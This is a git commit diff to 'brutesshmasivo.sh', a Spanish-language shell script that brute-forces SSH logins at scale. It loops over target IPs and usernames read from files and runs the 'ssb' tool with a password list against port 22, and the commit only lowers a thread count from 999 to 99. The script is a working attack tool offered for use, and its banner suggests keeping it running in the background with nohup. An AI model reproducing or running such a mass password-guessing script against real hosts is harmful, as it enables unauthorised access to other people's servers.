a04402e3f50d688e7444a5ee796e4df0a511bf1f
hackingyseguridad <antonio_taboada@hotmail.es>
2022-07-01 11:37:18 +0200

    Update brutesshmasivo.sh

--- brutesshmasivo.sh
+++ brutesshmasivo.sh
@@ -7,6 +7,6 @@ echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
 echo "Uso.: ./brutesshmasivo.sh "
 echo "##################################################################"
 for i in `cat ip.txt`; do echo $i "<=== IP ";
-for u in `cat usuarios.txt` ; do ssb -p 22 -w claves.txt -c 999 $u@$i;
+for u in `cat usuarios.txt` ; do ssb -p 22 -w claves.txt -c 99 $u@$i;
 done
 done
